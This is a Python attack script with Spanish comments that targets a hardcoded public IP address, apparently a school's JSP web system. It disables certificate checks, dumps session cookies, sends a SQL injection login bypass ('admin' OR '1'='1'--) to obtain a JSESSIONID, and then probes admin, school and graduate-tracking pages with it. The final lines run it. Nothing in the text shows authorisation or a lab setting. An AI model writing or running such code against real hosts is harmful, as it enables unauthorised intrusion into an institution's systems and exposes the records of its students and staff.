import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class SessionExploiter:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.base_url = f"https://{target_ip}"
        self.session = requests.Session()
        self.session.verify = False

    def analyze_session_management(self):
        """Analiza la gestión de sesiones"""
        print("[*] Analizando gestión de sesiones...")
        
        # Probar cerrar_sesion.jsp encontrado
        logout_url = f"{self.base_url}/jsp/cerrar_sesion.jsp"
        
        try:
            response = self.session.get(logout_url, timeout=5)
            print(f"[+] cerrar_sesion.jsp: {response.status_code}")
            
            # Verificar cookies de sesión
            if self.session.cookies:
                print("[+] Cookies de sesión encontradas:")
                for cookie in self.session.cookies:
                    print(f"    {cookie.name} = {cookie.value}")
            
            # Probar acceso a páginas después de logout
            test_url = f"{self.base_url}/jsp/index.jsp"
            response2 = self.session.get(test_url, timeout=5)
            
            if "login" in response2.text.lower():
                print("[!] Redirigido a login después de logout")
            else:
                print("[+] Posiblemente aún autenticado")
                
        except Exception as e:
            print(f"[-] Error analizando sesiones: {e}")

    def session_hijacking_test(self):
        """Prueba hijacking de sesión"""
        print("\n[*] Probando hijacking de sesión...")
        
        # Obtener una sesión válida primero
        try:
            # Intentar login con SQL injection exitoso
            login_data = {
                'yAccion': 'login',
                'yIntentos': '1',
                'yUsuario': '',
                'xUsuario': "admin' OR '1'='1'--",
                'xContrasena': 'x'
            }
            
            response = self.session.post(self.base_url, data=login_data, timeout=10)
            
            if 'JSESSIONID' in self.session.cookies:
                jsessionid = self.session.cookies['JSESSIONID']
                print(f"[+] JSESSIONID obtenida: {jsessionid}")
                
                # Probar la sesión en diferentes páginas
                test_pages = [
                    "/jsp/index.jsp",
                    "/jsp/admin/",
                    "/jsp/escolar/",
                    "/jsp/seguimiento_egreso/"
                ]
                
                for page in test_pages:
                    try:
                        url = f"{self.base_url}{page}"
                        response = self.session.get(url, timeout=5)
                        
                        if response.status_code == 200:
                            print(f"[+] Acceso concedido a: {page}")
                        else:
                            print(f"[-] Acceso denegado a: {page}")
                            
                    except Exception as e:
                        print(f"[-] Error accediendo a {page}: {e}")
                        
        except Exception as e:
            print(f"[-] Error en hijacking test: {e}")

# Ejecutar análisis de sesiones
session_exploiter = SessionExploiter("189.254.143.102")
session_exploiter.analyze_session_management()
session_exploiter.session_hijacking_test()